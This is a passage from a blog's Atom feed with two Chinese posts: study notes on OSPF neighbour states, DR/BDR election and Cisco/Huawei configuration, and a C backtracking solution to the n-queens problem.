点到点网络直接进入下一状态，ma网路进行DR/BDR选举</p><p>​             条件匹配：若条件匹配成功，进入下一状态</p><p>​                              若条件匹配失败，停留在当前状态，依靠hello保活邻居关系</p><p>Exstart预启动:通过类hello包DBD进行主从关系选举，router-id大的为主，优先进入下一状态</p><p>​                 （通过主从选举确定先发送DBD的一方，确保传输的可靠性和对链路带宽的占用小）          如果mtu不相同则停留在该阶段</p><p>exchange准交换：使用真正的DBD包进行数据库目录的共享</p><p>loading 加载：使用LSR/LSU/LSack来获取未知的LSA信息</p><p>lsr–请求列表-针对每一条发送lsu</p><p>lsu–重传列表-对方收到lsu后发送ack确认，如果没收到，则重发</p><p>full转发:邻接关系建立的标志</p><h5 id="5、OSPF工作方式"><a href="#5、OSPF工作方式" class="headerlink" title="5、OSPF工作方式"></a>5、OSPF工作方式</h5><p>启动宣告配置完成后，路由器开始组播（224.0.0.5）收发OSPF的hello包；若接收到的hello包中存在本地的route-id，建立邻居关系，生成邻居表；</p><p>之后基于表格中所有的邻居进行条件的匹配，匹配失败将维持邻居关系，仅hello包周期保活即可；</p><p>匹配成功者间可以建立邻接关系；邻居间使用DBD进行数据库目录的比对；之后使用LSR查询目录中未知的LSA信息，对端使用LSU来携带传递LSA，最终需要LSack进行接收确认；</p><p>当本地收集到区域内所有设备的LSA后，生成LSDB—链路状态数据库表；</p><p>本地基于LSDB启用SFP算法，计算到达所有未知网段的最短路径，然后将其加载到路由表内；</p><p>收敛完成，仅hello包周期保活所有的邻居和邻接关系；每30MIN周期进行DBD包的收发来进行纠错；</p><p>结构突变：</p><p>新增网段—直连新增网段设备使用DBD来告知所有的邻居，邻居进行LSR/LSU/LSACK收敛</p><p>断开网段—断开新增网段设备使用DBD来告知所有的邻居，邻居进行LSR/LSU/LSACK收敛</p><p>无法沟通—-dead time 和最大老化来解决</p><p>正常邻居间存在hello包，若超过dead time依然没有hello包，断开邻居关系，删除从该邻居处学习到的所有信息</p><p>若邻居关系依然正常，但每30min的周期没有正常进行，每条lsa后方存在一个老化时间，默认最大为3609s；到达最大老化时删除该LSA信息即可；</p><p>名词：</p><p>Router-ID：路由器标示符，用于标识该路由器在OSPF网络中的唯一性</p><p>选举规则：1.手工指定最优先    2.最大的环回接口地址  3.最大的物理接口</p><p>hello时间、dead时间：默认10、40或 30、120s</p><p>DR优先级 ：</p><p>DR：指定路由器</p><p>BDR：备份指定路由器</p><p>LSA：链路状态通告；在不同条件下存在不同类别的LSA，用于携带拓扑或路由</p><p>LSDB：链路状态数据库；所有LSA的集合</p><p>OSPF收敛行为—OSPF的LSA洪泛</p><p>​                           OSPF的LSDB同步</p><p>OSPF邻居关系建立条件：</p><p>1.router-ID必须不同    </p><p>2.area-ID必须一致</p><p>3.认证类型和认证型数据都一致   </p><p>4.hello时间、dead时间都一致  </p><p>5.特殊区域标识必须一致  </p><p>6.若在MA网络中，network mask必须一致</p><p>7.必须同时使用单播或组播</p><h5 id="6、OSPF基础配置"><a href="#6、OSPF基础配置" class="headerlink" title="6、OSPF基础配置"></a>6、OSPF基础配置</h5><h6 id="（一）cisco"><a href="#（一）cisco" class="headerlink" title="（一）cisco"></a>（一）cisco</h6><p>r1(config)#router ospf 1   启动时需要配置进程号，仅具有本地意义</p><p>r1(config-router)#router-id 1.1.1.1   配置RID，要求为全网唯一</p><p>​                              手工—环回接口最大数字—物理接口最大数字</p><p>宣告：1、激活  2、路由或拓扑   3、区域划分</p><p>r1(config-router)#network 1.1.1.1 0.0.0.0 area 0</p><p>r1(config-router)#network 12.1.1.0 0.0.0.255 area 0</p><p>​                                   反掩码</p><p>启动配置完成后，所有设备间使用hello包，发现并建立邻居关系，生成邻居表：</p><p>Hello time 为10s，dead time 为 hello time 的4倍；</p><p>r2#show ip ospf neighbor </p><p>Neighbor ID     Pri   State           Dead Time   Address         Interface</p><p>1.1.1.1           0   FULL/  -        00:00:34    12.1.1.1        Serial1/0</p><p>3.3.3.3           0   FULL/  -        00:00:39    23.1.1.2        Serial1/1</p><p>邻居关系建立后，邻居间进行条件匹配，匹配成功者间进入邻接关系；基于DBD/LSR/LSU/LSack获取未知LSA信息，生成LSDB–数据库表；</p><p>r2#show ip ospf database </p><p>LSDB同步完成后，本地使用SPF最短路径选路规则，将到达未知网段的路由加载路由表：</p><p>使用字母O标识通过OSPF学习的路由；</p><p>O      本地区域内的路由，是本地通过拓扑计算所得</p><p>O IA    域间路由，其他区域的路由，通过ABR共享进入的</p><p>管理距离为110；度量为cost值=开销值=参考带宽/接口带宽</p><p>默认参考带宽为100M；整段路径cost值之和最小为最佳路径；</p><p>注：当接口带宽大于参考带宽时，cost值为1；将可能导致选路不佳，建议修改参考带宽</p><p>r1(config)#router ospf 1 </p><p>r1(config-router)#auto-cost reference-bandwidth ?    </p><p>  <1-4294967>  The reference bandwidth in terms of Mbits per second</1-4294967></p><p>r1(config-router)#auto-cost reference-bandwidth 1000</p><p>切记：整个网络所有设备均需要修改一致；</p><p>【5】OSPF建立成为邻接关系的条件—-关注网络类型</p><p>点到点–在一个网段内只能存在两个节点</p><p>MA网络—在一个网段内节点数量不限制</p><p>在点到点网络ospf只能直接建立邻接关系；</p><p>在MA网络中为避免重复的更新，将进行DR/BDR选举，所有的非DR/BDR间仅建立邻居关系；DR/BDR与其他非DR/BDR建立邻接关系，基于224.0.0.6沟通；</p><p>选举规则：</p><p>比较接口优先级  0-255 大优  默认为1；</p><p>接口优先级若相同，比较RID；</p><p>r1(config)#interface fastEthernet 0/0</p><p>r1(config-if)#ip ospf priority 3  修改接口优先级</p><p>注：ospf选择非抢占的，因此在人为修改了优先级后，必须重启所有设备的OSPF进程</p><p>r1#clear ip ospf process </p><p>Reset ALL OSPF processes? [no]: yes</p><p>可以将设备的参选接口优先级修改为0,—-不参选；但至少留一台设备参选，否则将无DR,网络无法通行；</p><h6 id="（二）华为"><a href="#（二）华为" class="headerlink" title="（二）华为"></a>（二）华为</h6><p>[r1]ospf 1 router-id 1.1.1.1  启动时需要定义进程号，仅具有本地意义；  建议同时配置ROUTER-ID；</p><p>​                      手工—环回最大数值IP地址—物理接口最大数值IP地址</p><p>宣告：</p><p>[r2]ospf 1 router-id 2.2.2.2</p><p> [r2-ospf-1]area 0</p><p> [r2-ospf-1-area-0.0.0.0]network 12.1.1.2 0.0.0.0</p><p> [r2-ospf-1]area 1 </p><p> [r2-ospf-1-area-0.0.0.1]network 23.1.1.1 0.0.0.0</p><p>OSPF的区域划分规则：</p><p>星型结构—所有的非骨干区域必须连接到的骨干区域，否则不能进行区域间路由共享</p><p>ABR—区域边界路由器  同时工作的多个区域间；合法ABR必须同时工作在骨干区域，否则不能进行区域间的路由共享；</p><p>启动配置完成后，路由器间使用hello包收发建立邻居关系，生成邻居表：</p><p>[r2]display ospf peer</p><p>Area 0.0.0.0 interface 12.1.1.2(GigabitEthernet0/0/0)’s neighbors</p><p> Router ID: 1.1.1.1          Address: 12.1.1.1        </p><p>   State: Full  Mode:Nbr is  Slave  Priority: 1</p><p>   DR: 12.1.1.1  BDR: 12.1.1.2  MTU: 0    </p><p>   Dead timer due in 35  sec </p><p>   Retrans timer interval: 5 </p><p>   Neighbor is up for 00:18:48     </p><p>   Authentication Sequence: [ 0 ]</p><p>邻居关系建立后，邻居间进行条件的匹配；匹配成功建立邻接关系，同步LSDB完成后，本地生成LSDB—数据库表；</p><p>[r2]display ospf lsdb   查看数据库的目录；内部存在各种类别的信息，需要具体查看</p><p>LSDB同步完成后，本地基于SFP算法，计算到达所有未知网段的最短路径，然后将其加载到路由表中；</p><p>[r3]display  ip routing-table  查看路由表</p><p>Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</p><p>​        1.1.1.1/32  OSPF    10   2           D   23.1.1.1        GigabitEthernet0/0/0</p><p>​        2.2.2.2/32  OSPF    10   1           D   23.1.1.1        GigabitEthernet0/0/0</p><p>[r3]display ip routing-table protocol ospf  查看本地所有通过OSPF协议学习到的路由</p><p>[r1]display ospf routing    查看本地工作OSPF的直连，及本地通过OSPF学习到的路由</p><p>Destination        Cost  Type       NextHop         AdvRouter       Area</p><p> 1.1.1.1/32         0     Stub       1.1.1.1         1.1.1.1         0.0.0.0</p><p> 12.1.1.0/24        1     Transit     12.1.1.1        1.1.1.1         0.0.0.0</p><p> 2.2.2.2/32         1     Stub       12.1.1.2        2.2.2.2         0.0.0.0</p><p> 3.3.3.3/32         2     Inter-area  12.1.1.2        2.2.2.2         0.0.0.0</p><p> 23.1.1.0/24        2     Inter-area  12.1.1.2        2.2.2.2         0.0.0.0</p><p>  类型标记为Inter-area 代表其他区域产生的路由条目</p><p>OSPF的度量值为cost=开销值=参考带宽/接口带宽</p><p>默认的参考带宽为100M；OSPF默认优选整段路径cost之和最小；</p><p>若接口带宽大于参考带宽，cost值为1；将可能导致选路的不佳，建议修改默认的参考带宽；</p><p>[r1]ospf 1</p><p>[r1-ospf-1]bandwidth-reference 1000</p><p>切记：一旦修改，全网所有设备均需修改为一致；</p><p>​             </p><p>​     </p><p>​      </p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;一、动态路由协议&quot;&gt;&lt;a href=&quot;#一、动态路由协议&quot; class=&quot;headerlink&quot; title=&quot;一、动态路由协议&quot;&gt;&lt;/a&gt;一、动态路由协议&lt;/h4&gt;&lt;p&gt;1、动态路由协议：直连路由间构建邻居关系，通过相互沟通学习路由信息，来获取未知的路由信息，然后根据不同的路由选择算法，计算到达未知网段的最佳路径，并将其加载到路由表中。&lt;/p&gt;
    
    </summary>
    
      <category term="CCNP/HCNP" scheme="http://soliym.top/categories/CCNP-HCNP/"/>
    
    
      <category term="OSPF" scheme="http://soliym.top/tags/OSPF/"/>
    
  </entry>
  
  <entry>
    <title>n皇后</title>
    <link href="http://soliym.top/2021/06/19/n%E7%9A%87%E5%90%8E/"/>
    <id>http://soliym.top/2021/06/19/n皇后/</id>
    <published>2021-06-19T14:37:20.934Z</published>
    <updated>2019-04-06T14:34:57.514Z</updated>
    
    <content type="html"><![CDATA[<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><p>​        n皇后问题是指在一个n*n的国际象棋棋盘上放置n个皇后，使得这n个皇后两均不在同一行、同一列、同一条线上，求合法的方案数。</p><a id="more"></a><h4 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h4><p>​       如果采用枚举法判断每一种情况，需要枚举n^2的组合数，如果n=8;南无需要枚举54502232次，如果n再增大，需要枚举的次数就太过庞大。所以采用回溯法，尽量减少不必要的循环，当问题达到边界时，返回上一层，不必再浪费资源。如果只考虑每一行放置一个皇后、每一列也只放置一个皇后。从第一行开始放置皇后，当第一行的皇后确定后，结束循环，开始从下一行开始放置皇后，且放置皇后的位置不能与前面的皇后在同一列或同一条对角线。需要一个判断函数，判定在该位置能否放置皇后。如果一行的所有位置都不能放置皇后，那么回溯至上一行。</p><h5 id="回溯法"><a href="#回溯法" class="headerlink" title="回溯法"></a>回溯法</h5><p>按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的。</p><h4 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h4><h5 id="皇后位置比较算法"><a href="#皇后位置比较算法" class="headerlink" title="皇后位置比较算法"></a>皇后位置比较算法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool check(int x,int y)//皇后的放置位置是否合适</span><br><span class="line">&#123;//x为行，y为列</span><br><span class="line">int i;</span><br><span class="line">for(i=0;i&lt;x;i++)</span><br><span class="line">&#123;</span><br><span class="line">if(y==a[i]||abs(x-i)==abs(y-a[i]))</span><br><span class="line">//判断是否在同一列或同斜行</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>每一行放一个皇后，就解决了不在同行的问题。 </p></li><li><p>在第i行的时候，遍历n列，试探位置。和之前所有行放的位置进行比较。 </p></li><li>比较列：当前列col 不等于 之前 所有列。 即col != arr[i]。</li><li>比较斜线， 因为不再同一斜率为1或者-1的斜线。(row - i) / (col - arr[i]) != 1 或 -1 可以取巧用绝对值函数: abs(row-i) != abs(col-arr[i])。<h5 id="回溯算法"><a href="#回溯算法" class="headerlink" title="回溯算法"></a>回溯算法</h5></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void king(int k)</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">if(k==n)//如果n皇后符合位置，合法方案加一</span><br><span class="line">&#123;</span><br><span class="line">count++;//合法方案计数</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">for(i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">if(check(k,i))/*判断是否能放皇后，如果可以则记录皇后的所在的列，然后递归到下一行，如果不满足则回溯至上一行*/</span><br><span class="line">&#123;</span><br><span class="line">a[k]=i;</span><br><span class="line">king(k+1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  回溯每行放置一个皇后，记录每个皇后所在的列数，如果递归后的结果不符合，则回退至该位置，从该位置继续遍历。回溯的条件有两种，一种是在一行中没有找到适合放置皇后的位置，另一种是符合放置方案，然后回溯，寻找下一个方案。</p><h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> n=<span class="number">8</span>;</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;x;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(y==a[i]||<span class="built_in">abs</span>(x-i)==<span class="built_in">abs</span>(y-a[i]))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">king</span><span class="params">(<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span>(k==n)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(check(k,i))</span><br><span class="line">&#123;</span><br><span class="line">a[k]=i;</span><br><span class="line">king(k+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">king(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h4&gt;&lt;p&gt;​        n皇后问题是指在一个n*n的国际象棋棋盘上放置n个皇后，使得这n个皇后两均不在同一行、同一列、同一条线上，求合法的方案数。&lt;/p&gt;
    
    </summary>
    
      <category term="算法" scheme="http://soliym.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="递归" scheme="http://soliym.top/tags/%E9%80%92%E5%BD%92/"/>
    
  </entry>
  
</feed>
